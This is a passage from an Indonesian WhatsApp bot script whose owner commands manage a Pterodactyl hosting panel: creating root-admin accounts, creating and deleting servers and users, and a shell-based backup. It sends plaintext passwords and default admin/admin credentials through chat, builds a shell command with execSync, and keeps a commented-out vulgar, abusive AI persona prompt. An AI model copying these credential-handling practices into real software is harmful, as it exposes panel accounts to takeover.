 businessMessageForwardInfo: { businessOwnerJid: KhaerulZx.decodeJid(KhaerulZx.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the size you want to buy`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `ʙᴜʏ ᴘᴀɴᴇʟ ʀᴇᴋ`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: KhaerulZx.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break*/
case 'reinstall': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`*Anda Belum Menjadi Reseler Beli Reseler Skrng di owner agar Bisa Mengakses Fitur Cpanel!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break
case "listsrv": {
if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return;
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await KhaerulZx.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listusr": {
if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return;
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await KhaerulZx.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
if (banned.includes(m.sender)) {
    return;
    }
        if (!isCreator) return;

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return;
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
        if (!isCreator) return
/**
 * 
 * [ *CASE TRANSLATE* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//

case 'tr': {
if (banned.includes(m.sender)) {
    return;
    }
   if (!m.quoted || !m.quoted.text) return reply(`Reply pesan yang ingin diterjemahkan`);

   async function translate(query = "", lang) {
      if (!query.trim()) return "";
      const url = new URL("https://translate.googleapis.com/translate_a/single");
      url.searchParams.append("client", "gtx");
      url.searchParams.append("sl", "auto");
      url.searchParams.append("dt", "t");
      url.searchParams.append("tl", lang);
      url.searchParams.append("q", query);

      try {
         const response = await fetch(url.href);
         const data = await response.json();
         if (data && data[0]) {
            const translation = data[0].map((item) => item[0]?.trim() || "").join("\n");
            const sourceLang = data[2] ? data[2] : "Tidak diketahui"; // Jika source language tidak ditemukan
            return [translation, sourceLang];
         } else {
            return ["Tidak dapat menerjemahkan teks", ""];
         }
      } catch (err) {
         console.error(`Error saat menerjemahkan: ${err}`);
         return ["Terjadi kesalahan saat mencoba menerjemahkan", ""];
      }
   }

   try {
      let hasilTerjemahan = await translate(m.quoted.text, "id");
      m.reply(`${hasilTerjemahan[0]} (Bahasa Sumber: ${hasilTerjemahan[1]})`);
   } catch (err) {
      m.reply("Terjadi kesalahan dalam proses terjemahan.");
   }
}
break;
/**
 * 
 * [ *CASE TXT2IMG* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'txt2img': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply(`Contoh: ${prefix + command} beautifull girl`)
async function photoleap(prompt) {
    try {
        let result = []
        for (let i = 0; i < 3; i++) {
            let {
                data
            } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
            result.push(data.result_url)
        }
        return result
    } catch (e) {
        return ({
            msg: 404
        })
    }
}

let tahu = await photoleap(text)
for (const x of tahu) {
KhaerulZx.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break
/*case "addusr": {
if (!isCreator) return reply('Lu siapa bjir')
if (banned.includes(m.sender)) {
    return;
    }
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {}
   function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    
    let password = generateRandomPassword(12); // 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '828283838@newsletter',
 newsletterName: 'Powered By ꜰɪɴꜱɪɪ', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: KhaerulZx.decodeJid(KhaerulZx.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`ʙᴜʏ ᴘᴀɴᴇʟ ᴅ ꜰɪɴꜱɪɪ ʏᴏᴋ`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: KhaerulZx.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
KhaerulZx.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break*/
// create admin + server
case "admin2": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isCreator) return;
    let s = q.split(',');
    let email = s[0];
    let username = s[0];
    let nomor = s[1];
    if (s.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    if (!username) return reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`);
    if (!nomor) return reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`);
    let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    function generateRandomPassword(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let password = '';
        for (let i = 0; i < length; i++) {
            password += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return password;
    }
   let password = generateRandomPassword(10);
    let first_name = username + "buyerkhaerul";
    let last_name = username.toUpperCase() + "BUYERKHAERUL Memb";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": username + "@gmail.com",
            "username": username,
            "first_name": first_name,
            "last_name": last_name,
            "language": "en",
            "root_admin": true,
            "password": password.toString()
        })
    });

    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let tks = `
*Berikut adalah data admin panel anda*

USER: ${user.username}
PASSWORD: ${password}
LOGIN: ${global.domain}
CREATED AT: ${user.created_at}
`;
    await KhaerulZx.sendMessage(nomornya, { text: tks });
    let egg = global.eggsnya;
    let loc = global.location;
    let cpu = "0";
    let disk = "0";
    let name = username + "Unli";
    let startup_cmd = "npm start";

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": "0",
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━ ⬣『 *DATA AKUN* 』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${nomornya.split`@`[0]} Bang ${pushname}`);
}
break;
case "admin": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isCreator) return;
    let s = q.split(',');
    let email = s[0];
    let username = s[0];
    let nomor = s[1];
    if (s.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    if (!username) return reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`);
    if (!nomor) return reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`);
    let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';    
    function generateRandomPassword(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let password = '';
        for (let i = 0; i < length; i++) {
            password += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return password;
    }    
    let password = generateRandomPassword(10);
    let first_name = username + "buyerkhaerul";
    let last_name = username.toUpperCase() + "BUYERKHAERUL Memb";
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": username + "@gmail.com",
            "username": username,
            "first_name": first_name,
            "last_name": last_name,
            "language": "en",
            "root_admin": true,  
            "password": password.toString()
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let tks = `
    *Berikut adalah data admin panel anda*

    USER: ${user.username}
    PASSWORD: ${password}
    LOGIN: ${global.domain}
    CREATED AT: ${user.created_at}
    `;
    await KhaerulZx.sendMessage(nomornya, { text: tks });
}
break;
case "listadmin": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return;
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await KhaerulZx.sendMessage(m.chat, { text: messageText }, { quoted: fcall });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
if (!isCreator) return reply('Mau ngapain bg')
if (banned.includes(m.sender)) {
    return;
    }
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
if (banned.includes(m.sender)) {
    return;
    }
		 if (!isCreator) return reply(`ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
KhaerulZx.sendMessage(mq1, {text:`*───❖》KhaerulZx Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
                 }
            break
case 'picsum': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!q) return m.reply(`contoh \n\npicsum nature`);
  
  async function picSumAvz(text) {
    try {
      const imageUrl = `https://picsum.photos/seed/${q}/800/600`;
      return imageUrl;
    } catch (err) {
      return null;
    }
  }
//avs
  const result = await picSumAvz(q);
  if (result) {
    const message = {
      image: { url: result },
      caption: `hasil dari pencarian gambar : ${q}`
    };
    KhaerulZx.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break
case "webpanel":
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Gak mau 😝')
ewe = `nih kak ${domain}`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
if (banned.includes(m.sender)) {
    return;
    }
            if (!isCreator) return reply(`ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
if (banned.includes(m.sender)) {
    return;
    }
            if (!isCreator) return reply(`ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
if (banned.includes(m.sender)) {
    return;
    }
let action = command.replace('srv', '')
if (!isCreator) return reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
tut = `ᴛᴜᴛᴏʀ ʀᴜɴ ᴘᴀɴᴇʟ ʙʏ ᴋʏʏxᴅ
https://youtu.be/rqqxkI4P8YY`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
//=================================================//
case 'backup':
        {
        if (banned.includes(m.sender)) {
    return;
    }
          if (!isCreator) return reply(mess.owner)
     await reply("ᴡᴀɪᴛ ʙᴀᴄᴋᴜᴘ sᴄ ꜰɪɴꜱɪɪ ᴠ4.5");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "KhaerulZx" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r KhaerulZx.zip ${ls.join(" ")}`);
          await KhaerulZx.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./KhaerulZx.zip"),
              mimetype: "application/zip",
              fileName: "hanakov3.7.zip",
            },
            { quoted: fcall }
          );
          await execSync("rm -rf Kayy.zip");
        }
        break
//=================================================//

case'zeta':{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`*Example :* ${prefix + command} Haiii, Perkenalkan Dirimu`)
let zeta = await fetchJson(`https://api.kyuurzy.site/api/ai/aizeta?query=${text}`)
KhaerulZx.sendMessage(m.chat, { text : `${zeta.result.answer}`},{quoted:m})
}
break
case 'fb':
case 'fbdl':
           case 'facebook':
           case 'facebookvid': {
           if (!text)  return reply(`Silakan kirimkan tautan video Facebook\n\nCONTOH :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
     reply('tunggu sebentar ya..')
  try {
    const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
    const tex = `*[ FACEBOOK DL BY ${botname} ]*`;
    const videoBuffer = data.result.HD;
    KhaerulZx.sendMessage(m.chat, { caption: tex, video: { url: videoBuffer} }, { quoted: m });
  } catch (error) {
    reply('Yah error kak')
  }
  }
  break
/*case'ambatukam':{
if (!text) return reply(`Contoh: ${prefix + command} siapa penciptamu`)
let prompt = "nama mu adalah ambatukam, sifat kamu adalah jahat, kasar, marah dan galak. seperti kasarnya anjing, goblok, kontol, ngentot, kamu tercipta dari air muani khas ngawi, ayahmu bernama ambarukmo dan ibumu bernama ambayanti mereka adalah raja dan ratu pendahulu kamu di kerajaan ngawi empire, jika seseorang memanggilmu hytam atau hitam maka balas lah dengan kata : bacot lu suki sama sama hytam ngatain hytam, jika kamu dipanggil suki kamu akan marah dan melontarkan kata kata kasar, kamu adalah raja jomok terkuat, hobi kamu adalah coli dan ngewe rusdi, kamu coli 50x sehari"//You can change the prompt as you like
let burassa = await fetchJson(`https://widipe.com/ai/c-ai?prompt=${prompt}?query=${text}`)
KhaerulZx.sendMessage(m.chat, { text : `${burassa.result}`},{quoted:m})
}
break */
/*case'yar':{
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} siapa penciptamu`);
  }
